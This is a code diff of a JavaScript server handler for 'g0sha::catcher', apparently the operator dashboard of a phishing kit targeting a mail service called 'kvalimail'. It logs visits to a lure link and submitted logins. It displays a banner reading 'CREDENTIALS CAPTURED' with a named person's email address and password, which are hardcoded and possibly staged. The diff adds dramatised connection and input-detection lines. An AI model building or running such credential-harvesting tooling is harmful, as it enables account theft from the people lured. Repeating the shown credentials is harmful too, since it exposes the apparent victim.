@@ -11,7 +11,7 @@ export default async function handler(req, res) {
       const t = new Date(e.t).toLocaleTimeString('ru-RU', { timeZone: 'Asia/Tbilisi' });
       return `<div>[${t}] ${e.kind === 'open' ? 'GET /d/k7q2m  200  ' + esc(e.ua) : 'POST login=' + esc(e.login) + ' pass=******  -> blank'}</div>`;
     }).join('');
-    const hit = phished ? `<div class="hit">[!!!] CREDENTIALS CAPTURED<br>login: nino.k@supra-events.ge<br>pass:  Tamada2026!<br>mail:  https://kvalimail.vercel.app</div>` : '<div class="wait">waiting for target_</div>';
+    const hit = phished ? `<div class="hit">[+] connect: iPhone, Tbilisi, GE<br>[+] input detected...<br>[!!!] CREDENTIALS CAPTURED<br>login: nino.k@supra-events.ge<br>pass:  Tamada2026!<br>mail:  https://kvalimail.vercel.app</div>` : '<div class="wait">waiting for target_</div>';
     return res.send(`<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="10"><title>g0sha :: catcher</title>
 <style>body{background:#0b0f0c;color:#3ddc84;font:13px/1.5 ui-monospace,Menlo,monospace;padding:16px;margin:0}h1{font-size:14px;color:#9be7b8}.hit{color:#ffd43b;border:1px solid #ffd43b;padding:10px;margin:12px 0}.wait{color:#5c7a66;animation:b 1s steps(2) infinite}@keyframes b{50%{opacity:.4}}#l{color:#7fa58c;margin-top:10px}</style></head><body>
 <h1>g0sha::catcher v0.3 &nbsp;|&nbsp; target: kvalimail &nbsp;|&nbsp; autorefresh 10s</h1>${hit}<div id="l">${rows || '<div>no hits yet</div>'}</div></body></html>`);
